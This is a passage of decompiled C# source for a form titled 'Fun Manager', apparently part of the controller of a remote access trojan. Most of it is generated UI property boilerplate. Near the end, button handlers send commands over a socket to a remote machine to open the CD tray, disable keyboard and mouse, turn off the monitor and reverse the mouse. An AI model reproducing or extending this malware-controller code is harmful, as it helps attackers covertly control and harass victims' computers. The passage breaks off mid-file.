				{
					this._Button49.Click -= value2;
				}
				this._Button49 = value;
				if (this._Button49 != null)
				{
					this._Button49.Click += value2;
				}
			}
		}

		// Token: 0x170001E5 RID: 485
		// (get) Token: 0x060004D8 RID: 1240 RVA: 0x0002E910 File Offset: 0x0002CB10
		// (set) Token: 0x060004D9 RID: 1241 RVA: 0x0002E928 File Offset: 0x0002CB28
		internal virtual Button Button50
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button50;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button50_Click);
				if (this._Button50 != null)
				{
					this._Button50.Click -= value2;
				}
				this._Button50 = value;
				if (this._Button50 != null)
				{
					this._Button50.Click += value2;
				}
			}
		}

		// Token: 0x170001E6 RID: 486
		// (get) Token: 0x060004DA RID: 1242 RVA: 0x0002E980 File Offset: 0x0002CB80
		// (set) Token: 0x060004DB RID: 1243 RVA: 0x0002E998 File Offset: 0x0002CB98
		internal virtual Button Button51
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button51;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button51_Click);
				if (this._Button51 != null)
				{
					this._Button51.Click -= value2;
				}
				this._Button51 = value;
				if (this._Button51 != null)
				{
					this._Button51.Click += value2;
				}
			}
		}

		// Token: 0x170001E7 RID: 487
		// (get) Token: 0x060004DC RID: 1244 RVA: 0x0002E9F0 File Offset: 0x0002CBF0
		// (set) Token: 0x060004DD RID: 1245 RVA: 0x0002EA08 File Offset: 0x0002CC08
		internal virtual Button Button52
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button52;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button52_Click);
				if (this._Button52 != null)
				{
					this._Button52.Click -= value2;
				}
				this._Button52 = value;
				if (this._Button52 != null)
				{
					this._Button52.Click += value2;
				}
			}
		}

		// Token: 0x170001E8 RID: 488
		// (get) Token: 0x060004DE RID: 1246 RVA: 0x0002EA60 File Offset: 0x0002CC60
		// (set) Token: 0x060004DF RID: 1247 RVA: 0x00003863 File Offset: 0x00001A63
		internal virtual CheckBox Check_Sound
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Check_Sound;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Check_Sound = value;
			}
		}

		// Token: 0x170001E9 RID: 489
		// (get) Token: 0x060004E0 RID: 1248 RVA: 0x0002EA78 File Offset: 0x0002CC78
		// (set) Token: 0x060004E1 RID: 1249 RVA: 0x0000386C File Offset: 0x00001A6C
		internal virtual ComboBox ComboBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ComboBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ComboBox2 = value;
			}
		}

		// Token: 0x170001EA RID: 490
		// (get) Token: 0x060004E2 RID: 1250 RVA: 0x0002EA90 File Offset: 0x0002CC90
		// (set) Token: 0x060004E3 RID: 1251 RVA: 0x0002EAA8 File Offset: 0x0002CCA8
		internal virtual ComboBox ComboBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ComboBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ComboBox1_SelectedIndexChanged);
				if (this._ComboBox1 != null)
				{
					this._ComboBox1.SelectedIndexChanged -= value2;
				}
				this._ComboBox1 = value;
				if (this._ComboBox1 != null)
				{
					this._ComboBox1.SelectedIndexChanged += value2;
				}
			}
		}

		// Token: 0x170001EB RID: 491
		// (get) Token: 0x060004E4 RID: 1252 RVA: 0x0002EB00 File Offset: 0x0002CD00
		// (set) Token: 0x060004E5 RID: 1253 RVA: 0x0002EB18 File Offset: 0x0002CD18
		internal virtual Button Button36
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button36;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button36_Click);
				if (this._Button36 != null)
				{
					this._Button36.Click -= value2;
				}
				this._Button36 = value;
				if (this._Button36 != null)
				{
					this._Button36.Click += value2;
				}
			}
		}

		// Token: 0x170001EC RID: 492
		// (get) Token: 0x060004E6 RID: 1254 RVA: 0x0002EB70 File Offset: 0x0002CD70
		// (set) Token: 0x060004E7 RID: 1255 RVA: 0x0002EB88 File Offset: 0x0002CD88
		internal virtual Button Button34
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button34;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button34_Click);
				if (this._Button34 != null)
				{
					this._Button34.Click -= value2;
				}
				this._Button34 = value;
				if (this._Button34 != null)
				{
					this._Button34.Click += value2;
				}
			}
		}

		// Token: 0x170001ED RID: 493
		// (get) Token: 0x060004E8 RID: 1256 RVA: 0x0002EBE0 File Offset: 0x0002CDE0
		// (set) Token: 0x060004E9 RID: 1257 RVA: 0x00003875 File Offset: 0x00001A75
		internal virtual TextBox TextBox5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox5 = value;
			}
		}

		// Token: 0x170001EE RID: 494
		// (get) Token: 0x060004EA RID: 1258 RVA: 0x0002EBF8 File Offset: 0x0002CDF8
		// (set) Token: 0x060004EB RID: 1259 RVA: 0x0000387E File Offset: 0x00001A7E
		internal virtual Label Label3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label3 = value;
			}
		}

		// Token: 0x170001EF RID: 495
		// (get) Token: 0x060004EC RID: 1260 RVA: 0x0002EC10 File Offset: 0x0002CE10
		// (set) Token: 0x060004ED RID: 1261 RVA: 0x00003887 File Offset: 0x00001A87
		internal virtual Label Label4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label4 = value;
			}
		}

		// Token: 0x170001F0 RID: 496
		// (get) Token: 0x060004EE RID: 1262 RVA: 0x0002EC28 File Offset: 0x0002CE28
		// (set) Token: 0x060004EF RID: 1263 RVA: 0x00003890 File Offset: 0x00001A90
		internal virtual TextBox TextBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox3 = value;
			}
		}

		// Token: 0x170001F1 RID: 497
		// (get) Token: 0x060004F0 RID: 1264 RVA: 0x0002EC40 File Offset: 0x0002CE40
		// (set) Token: 0x060004F1 RID: 1265 RVA: 0x0002EC58 File Offset: 0x0002CE58
		internal virtual Button Button35
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button35;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button35_Click);
				if (this._Button35 != null)
				{
					this._Button35.Click -= value2;
				}
				this._Button35 = value;
				if (this._Button35 != null)
				{
					this._Button35.Click += value2;
				}
			}
		}

		// Token: 0x170001F2 RID: 498
		// (get) Token: 0x060004F2 RID: 1266 RVA: 0x0002ECB0 File Offset: 0x0002CEB0
		// (set) Token: 0x060004F3 RID: 1267 RVA: 0x00003899 File Offset: 0x00001A99
		internal virtual TextBox TextBox4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox4 = value;
			}
		}

		// Token: 0x170001F3 RID: 499
		// (get) Token: 0x060004F4 RID: 1268 RVA: 0x0002ECC8 File Offset: 0x0002CEC8
		// (set) Token: 0x060004F5 RID: 1269 RVA: 0x0002ECE0 File Offset: 0x0002CEE0
		internal virtual Button Button38
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button38;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button38_Click);
				if (this._Button38 != null)
				{
					this._Button38.Click -= value2;
				}
				this._Button38 = value;
				if (this._Button38 != null)
				{
					this._Button38.Click += value2;
				}
			}
		}

		// Token: 0x170001F4 RID: 500
		// (get) Token: 0x060004F6 RID: 1270 RVA: 0x0002ED38 File Offset: 0x0002CF38
		// (set) Token: 0x060004F7 RID: 1271 RVA: 0x0002ED50 File Offset: 0x0002CF50
		internal virtual Button Button37
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button37;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button37_Click);
				if (this._Button37 != null)
				{
					this._Button37.Click -= value2;
				}
				this._Button37 = value;
				if (this._Button37 != null)
				{
					this._Button37.Click += value2;
				}
			}
		}

		// Token: 0x170001F5 RID: 501
		// (get) Token: 0x060004F8 RID: 1272 RVA: 0x0002EDA8 File Offset: 0x0002CFA8
		// (set) Token: 0x060004F9 RID: 1273 RVA: 0x000038A2 File Offset: 0x00001AA2
		internal virtual Label Label6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label6 = value;
			}
		}

		// Token: 0x170001F6 RID: 502
		// (get) Token: 0x060004FA RID: 1274 RVA: 0x0002EDC0 File Offset: 0x0002CFC0
		// (set) Token: 0x060004FB RID: 1275 RVA: 0x000038AB File Offset: 0x00001AAB
		internal virtual PictureBox PictureBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PictureBox1 = value;
			}
		}

		// Token: 0x170001F7 RID: 503
		// (get) Token: 0x060004FC RID: 1276 RVA: 0x0002EDD8 File Offset: 0x0002CFD8
		// (set) Token: 0x060004FD RID: 1277 RVA: 0x000038B4 File Offset: 0x00001AB4
		internal virtual Label Label5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label5 = value;
			}
		}

		// Token: 0x170001F8 RID: 504
		// (get) Token: 0x060004FE RID: 1278 RVA: 0x0002EDF0 File Offset: 0x0002CFF0
		// (set) Token: 0x060004FF RID: 1279 RVA: 0x000038BD File Offset: 0x00001ABD
		internal virtual TextBox TextBox7
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox7;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox7 = value;
			}
		}

		// Token: 0x170001F9 RID: 505
		// (get) Token: 0x06000500 RID: 1280 RVA: 0x0002EE08 File Offset: 0x0002D008
		// (set) Token: 0x06000501 RID: 1281 RVA: 0x000038C6 File Offset: 0x00001AC6
		internal virtual TextBox TextBox6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox6 = value;
			}
		}

		// Token: 0x170001FA RID: 506
		// (get) Token: 0x06000502 RID: 1282 RVA: 0x0002EE20 File Offset: 0x0002D020
		// (set) Token: 0x06000503 RID: 1283 RVA: 0x0002EE38 File Offset: 0x0002D038
		internal virtual ComboBox ComboBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ComboBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ComboBox3_SelectedIndexChanged);
				if (this._ComboBox3 != null)
				{
					this._ComboBox3.SelectedIndexChanged -= value2;
				}
				this._ComboBox3 = value;
				if (this._ComboBox3 != null)
				{
					this._ComboBox3.SelectedIndexChanged += value2;
				}
			}
		}

		// Token: 0x170001FB RID: 507
		// (get) Token: 0x06000504 RID: 1284 RVA: 0x0002EE90 File Offset: 0x0002D090
		// (set) Token: 0x06000505 RID: 1285 RVA: 0x0002EEA8 File Offset: 0x0002D0A8
		internal virtual Button Button55
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button55;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button55_Click);
				if (this._Button55 != null)
				{
					this._Button55.Click -= value2;
				}
				this._Button55 = value;
				if (this._Button55 != null)
				{
					this._Button55.Click += value2;
				}
			}
		}

		// Token: 0x170001FC RID: 508
		// (get) Token: 0x06000506 RID: 1286 RVA: 0x0002EF00 File Offset: 0x0002D100
		// (set) Token: 0x06000507 RID: 1287 RVA: 0x000038CF File Offset: 0x00001ACF
		internal virtual PictureBox PictureBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PictureBox2 = value;
			}
		}

		// Token: 0x170001FD RID: 509
		// (get) Token: 0x06000508 RID: 1288 RVA: 0x0002EF18 File Offset: 0x0002D118
		// (set) Token: 0x06000509 RID: 1289 RVA: 0x0002EF30 File Offset: 0x0002D130
		internal virtual Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				if (this._Timer1 != null)
				{
					this._Timer1.Tick -= value2;
				}
				this._Timer1 = value;
				if (this._Timer1 != null)
				{
					this._Timer1.Tick += value2;
				}
			}
		}

		// Token: 0x170001FE RID: 510
		// (get) Token: 0x0600050A RID: 1290 RVA: 0x0002EF88 File Offset: 0x0002D188
		// (set) Token: 0x0600050B RID: 1291 RVA: 0x000038D8 File Offset: 0x00001AD8
		internal virtual NumericUpDown NumericUpDown1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NumericUpDown1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._NumericUpDown1 = value;
			}
		}

		// Token: 0x170001FF RID: 511
		// (get) Token: 0x0600050C RID: 1292 RVA: 0x0002EFA0 File Offset: 0x0002D1A0
		// (set) Token: 0x0600050D RID: 1293 RVA: 0x000038E1 File Offset: 0x00001AE1
		internal virtual Label Label7
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label7;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label7 = value;
			}
		}

		// Token: 0x17000200 RID: 512
		// (get) Token: 0x0600050E RID: 1294 RVA: 0x0002EFB8 File Offset: 0x0002D1B8
		// (set) Token: 0x0600050F RID: 1295 RVA: 0x000038EA File Offset: 0x00001AEA
		internal virtual Panel PN1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PN1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PN1 = value;
			}
		}

		// Token: 0x17000201 RID: 513
		// (get) Token: 0x06000510 RID: 1296 RVA: 0x0002EFD0 File Offset: 0x0002D1D0
		// (set) Token: 0x06000511 RID: 1297 RVA: 0x000038F3 File Offset: 0x00001AF3
		internal virtual Panel PN2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PN2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PN2 = value;
			}
		}

		// Token: 0x17000202 RID: 514
		// (get) Token: 0x06000512 RID: 1298 RVA: 0x0002EFE8 File Offset: 0x0002D1E8
		// (set) Token: 0x06000513 RID: 1299 RVA: 0x000038FC File Offset: 0x00001AFC
		internal virtual Panel Pn3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Pn3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Pn3 = value;
			}
		}

		// Token: 0x17000203 RID: 515
		// (get) Token: 0x06000514 RID: 1300 RVA: 0x0002F000 File Offset: 0x0002D200
		// (set) Token: 0x06000515 RID: 1301 RVA: 0x00003905 File Offset: 0x00001B05
		internal virtual Panel PN4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PN4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PN4 = value;
			}
		}

		// Token: 0x17000204 RID: 516
		// (get) Token: 0x06000516 RID: 1302 RVA: 0x0002F018 File Offset: 0x0002D218
		// (set) Token: 0x06000517 RID: 1303 RVA: 0x0000390E File Offset: 0x00001B0E
		internal virtual GroupPanelBox GroupPanelBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupPanelBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupPanelBox2 = value;
			}
		}

		// Token: 0x17000205 RID: 517
		// (get) Token: 0x06000518 RID: 1304 RVA: 0x0002F030 File Offset: 0x0002D230
		// (set) Token: 0x06000519 RID: 1305 RVA: 0x00003917 File Offset: 0x00001B17
		internal virtual GroupPanelBox GroupPanelBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupPanelBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupPanelBox1 = value;
			}
		}

		// Token: 0x17000206 RID: 518
		// (get) Token: 0x0600051A RID: 1306 RVA: 0x0002F048 File Offset: 0x0002D248
		// (set) Token: 0x0600051B RID: 1307 RVA: 0x00003920 File Offset: 0x00001B20
		internal virtual GroupDropBox GroupDropBox6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupDropBox6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupDropBox6 = value;
			}
		}

		// Token: 0x17000207 RID: 519
		// (get) Token: 0x0600051C RID: 1308 RVA: 0x0002F060 File Offset: 0x0002D260
		// (set) Token: 0x0600051D RID: 1309 RVA: 0x00003929 File Offset: 0x00001B29
		internal virtual GroupDropBox GroupDropBox5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupDropBox5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupDropBox5 = value;
			}
		}

		// Token: 0x17000208 RID: 520
		// (get) Token: 0x0600051E RID: 1310 RVA: 0x0002F078 File Offset: 0x0002D278
		// (set) Token: 0x0600051F RID: 1311 RVA: 0x00003932 File Offset: 0x00001B32
		internal virtual GroupDropBox GroupDropBox4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupDropBox4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupDropBox4 = value;
			}
		}

		// Token: 0x17000209 RID: 521
		// (get) Token: 0x06000520 RID: 1312 RVA: 0x0002F090 File Offset: 0x0002D290
		// (set) Token: 0x06000521 RID: 1313 RVA: 0x0000393B File Offset: 0x00001B3B
		internal virtual GroupDropBox GroupDropBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupDropBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupDropBox3 = value;
			}
		}

		// Token: 0x1700020A RID: 522
		// (get) Token: 0x06000522 RID: 1314 RVA: 0x0002F0A8 File Offset: 0x0002D2A8
		// (set) Token: 0x06000523 RID: 1315 RVA: 0x00003944 File Offset: 0x00001B44
		internal virtual GroupDropBox GroupDropBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupDropBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupDropBox2 = value;
			}
		}

		// Token: 0x1700020B RID: 523
		// (get) Token: 0x06000524 RID: 1316 RVA: 0x0002F0C0 File Offset: 0x0002D2C0
		// (set) Token: 0x06000525 RID: 1317 RVA: 0x0000394D File Offset: 0x00001B4D
		internal virtual GroupDropBox GroupDropBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupDropBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupDropBox1 = value;
			}
		}

		// Token: 0x1700020C RID: 524
		// (get) Token: 0x06000526 RID: 1318 RVA: 0x0002F0D8 File Offset: 0x0002D2D8
		// (set) Token: 0x06000527 RID: 1319 RVA: 0x00003956 File Offset: 0x00001B56
		internal virtual TabControl TabControl1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TabControl1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TabControl1 = value;
			}
		}

		// Token: 0x1700020D RID: 525
		// (get) Token: 0x06000528 RID: 1320 RVA: 0x0002F0F0 File Offset: 0x0002D2F0
		// (set) Token: 0x06000529 RID: 1321 RVA: 0x0000395F File Offset: 0x00001B5F
		internal virtual TabPage TabPage1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TabPage1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TabPage1 = value;
			}
		}

		// Token: 0x1700020E RID: 526
		// (get) Token: 0x0600052A RID: 1322 RVA: 0x0002F108 File Offset: 0x0002D308
		// (set) Token: 0x0600052B RID: 1323 RVA: 0x00003968 File Offset: 0x00001B68
		internal virtual TabPage TabPage2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TabPage2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TabPage2 = value;
			}
		}

		// Token: 0x1700020F RID: 527
		// (get) Token: 0x0600052C RID: 1324 RVA: 0x0002F120 File Offset: 0x0002D320
		// (set) Token: 0x0600052D RID: 1325 RVA: 0x00003971 File Offset: 0x00001B71
		internal virtual TabPage TabPage3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TabPage3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TabPage3 = value;
			}
		}

		// Token: 0x17000210 RID: 528
		// (get) Token: 0x0600052E RID: 1326 RVA: 0x0002F138 File Offset: 0x0002D338
		// (set) Token: 0x0600052F RID: 1327 RVA: 0x0000397A File Offset: 0x00001B7A
		internal virtual TabPage TabPage4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TabPage4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TabPage4 = value;
			}
		}

		// Token: 0x17000211 RID: 529
		// (get) Token: 0x06000530 RID: 1328 RVA: 0x0002F150 File Offset: 0x0002D350
		// (set) Token: 0x06000531 RID: 1329 RVA: 0x0002F168 File Offset: 0x0002D368
		internal virtual Button Button43
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button43;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button43_Click);
				if (this._Button43 != null)
				{
					this._Button43.Click -= value2;
				}
				this._Button43 = value;
				if (this._Button43 != null)
				{
					this._Button43.Click += value2;
				}
			}
		}

		// Token: 0x17000212 RID: 530
		// (get) Token: 0x06000532 RID: 1330 RVA: 0x0002F1C0 File Offset: 0x0002D3C0
		// (set) Token: 0x06000533 RID: 1331 RVA: 0x00003983 File Offset: 0x00001B83
		internal virtual Panel Panel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel1 = value;
			}
		}

		// Token: 0x17000213 RID: 531
		// (get) Token: 0x06000534 RID: 1332 RVA: 0x0002F1D8 File Offset: 0x0002D3D8
		// (set) Token: 0x06000535 RID: 1333 RVA: 0x0002F1F0 File Offset: 0x0002D3F0
		internal virtual Button Button27
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button27;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button27_Click_1);
				if (this._Button27 != null)
				{
					this._Button27.Click -= value2;
				}
				this._Button27 = value;
				if (this._Button27 != null)
				{
					this._Button27.Click += value2;
				}
			}
		}

		// Token: 0x17000214 RID: 532
		// (get) Token: 0x06000536 RID: 1334 RVA: 0x0002F248 File Offset: 0x0002D448
		// (set) Token: 0x06000537 RID: 1335 RVA: 0x0002F260 File Offset: 0x0002D460
		internal virtual Button Button39
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button39;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button39_Click);
				if (this._Button39 != null)
				{
					this._Button39.Click -= value2;
				}
				this._Button39 = value;
				if (this._Button39 != null)
				{
					this._Button39.Click += value2;
				}
			}
		}

		// Token: 0x17000215 RID: 533
		// (get) Token: 0x06000538 RID: 1336 RVA: 0x0002F2B8 File Offset: 0x0002D4B8
		// (set) Token: 0x06000539 RID: 1337 RVA: 0x0002F2D0 File Offset: 0x0002D4D0
		internal virtual Button Button53
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button53;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button53_Click);
				if (this._Button53 != null)
				{
					this._Button53.Click -= value2;
				}
				this._Button53 = value;
				if (this._Button53 != null)
				{
					this._Button53.Click += value2;
				}
			}
		}

		// Token: 0x17000216 RID: 534
		// (get) Token: 0x0600053A RID: 1338 RVA: 0x0002F328 File Offset: 0x0002D528
		// (set) Token: 0x0600053B RID: 1339 RVA: 0x0002F340 File Offset: 0x0002D540
		internal virtual Button Button54
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button54;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button54_Click);
				if (this._Button54 != null)
				{
					this._Button54.Click -= value2;
				}
				this._Button54 = value;
				if (this._Button54 != null)
				{
					this._Button54.Click += value2;
				}
			}
		}

		// Token: 0x0600053C RID: 1340 RVA: 0x0000398C File Offset: 0x00001B8C
		private void Form9_FormClosing(object sender, FormClosingEventArgs e)
		{
			this.sk.CN = false;
		}

		// Token: 0x0600053D RID: 1341 RVA: 0x0002F398 File Offset: 0x0002D598
		private void Form9_Load(object sender, EventArgs e)
		{
			this.ComboBox2.SelectedIndex = 0;
			this.ComboBox1.SelectedIndex = 0;
			this.ComboBox3.Items.Clear();
			this.Text = Conversions.ToString(Operators.ConcatenateObject("Fun Manager - ", ima.vno(this.osk.L)));
			this.Timer1.Start();
			checked
			{
				try
				{
					string[] files = Directory.GetFiles(Conversions.ToString(this.folder));
					for (int i = 0; i < files.Length; i++)
					{
						string text = files[i];
						string item = text.ToString().Replace(Conversions.ToString(this.folder), "");
						FileInfo fileInfo = new FileInfo(text);
						if (Operators.CompareString(fileInfo.Extension, ".jpg", false) == 0)
						{
							this.ComboBox3.Items.Add(item);
						}
						else if (Operators.CompareString(fileInfo.Extension, ".png", false) == 0)
						{
							this.ComboBox3.Items.Add(item);
						}
						else if (Operators.CompareString(fileInfo.Extension, ".gif", false) == 0)
						{
							this.ComboBox3.Items.Add(item);
						}
					}
					this.ComboBox3.SelectedIndex = 0;
					this.PictureBox2.Image = Image.FromFile(Conversions.ToString(Operators.ConcatenateObject(this.folder, this.ComboBox3.Text)));
				}
				catch (Exception expr_15F)
				{
					ProjectData.SetProjectError(expr_15F);
					ProjectData.ClearProjectError();
				}
			}
		}

		// Token: 0x0600053E RID: 1342 RVA: 0x0000399A File Offset: 0x00001B9A
		private void Button1_Click(object sender, EventArgs e)
		{
			this.sk.Send("OpenCD");
		}

		// Token: 0x0600053F RID: 1343 RVA: 0x000039AD File Offset: 0x00001BAD
		private void Button2_Click(object sender, EventArgs e)
		{
			this.sk.Send("CloseCD");
		}

		// Token: 0x06000540 RID: 1344 RVA: 0x000039C0 File Offset: 0x00001BC0
		private void Button4_Click(object sender, EventArgs e)
		{
			this.sk.Send("DisableKM");
		}

		// Token: 0x06000541 RID: 1345 RVA: 0x000039D3 File Offset: 0x00001BD3
		private void Button3_Click(object sender, EventArgs e)
		{
			this.sk.Send("EnableKM");
		}

		// Token: 0x06000542 RID: 1346 RVA: 0x000039E6 File Offset: 0x00001BE6
		private void Button6_Click(object sender, EventArgs e)
		{
			this.sk.Send("TurnOnMonitor");
		}

		// Token: 0x06000543 RID: 1347 RVA: 0x000039F9 File Offset: 0x00001BF9
		private void Button5_Click(object sender, EventArgs e)
		{
			this.sk.Send("TurnOffMonitor");
		}

		// Token: 0x06000544 RID: 1348 RVA: 0x00003A0C File Offset: 0x00001C0C
		private void Button8_Click(object sender, EventArgs e)
		{
			this.sk.Send("NormalMouse");
		}

		// Token: 0x06000545 RID: 1349 RVA: 0x00003A1F File Offset: 0x00001C1F
		private void Button7_Click(object sender, EventArgs e)
		{
			this.sk.Send("ReverseMouse");
		}

		// Token: 0x06000546 RID: 1350 RVA: 0x00003A32 File Offset: 0x00001C32
